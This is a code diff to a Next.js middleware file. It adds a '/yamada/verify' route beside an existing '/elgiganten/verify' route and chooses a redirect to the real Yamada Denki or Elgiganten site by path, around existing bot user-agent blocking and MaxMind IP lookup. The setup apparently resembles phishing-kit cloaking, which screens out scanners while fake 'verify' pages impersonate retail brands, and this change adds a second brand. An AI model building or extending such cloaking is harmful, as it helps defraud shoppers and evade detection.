@@ -2,11 +2,14 @@
 import { NextResponse, NextRequest } from "next/server";
 
 export const config = {
-  matcher: ["/elgiganten/verify/:path*"],
+  matcher: ["/elgiganten/verify/:path*", "/yamada/verify/:path*"],
 };
 
 /* ========= RUNTIME CONFIG / LOGGING ========= */
-const REDIRECT_URL = "https://www.elgiganten.se";
+function getRedirectUrl(pathname: string): string {
+  if (pathname.startsWith("/yamada")) return "https://www.yamada-denki.jp";
+  return "https://www.elgiganten.se";
+}
 const VERBOSE = process.env.MW_VERBOSE_LOGS !== "0";
 const log = (...args: any[]) => VERBOSE && console.log("[MW]", ...args);
 
@@ -226,6 +229,7 @@ async function maxmindLookup(req: NextRequest, ip: string) {
 export async function middleware(req: NextRequest) {
   const ua = req.headers.get("user-agent") || "";
   const ip = getClientIp(req);
+  const REDIRECT_URL = getRedirectUrl(req.nextUrl.pathname);
   log("— MW START —", { path: req.nextUrl.pathname, ip, ua });
 
   // 0) Bot UA block
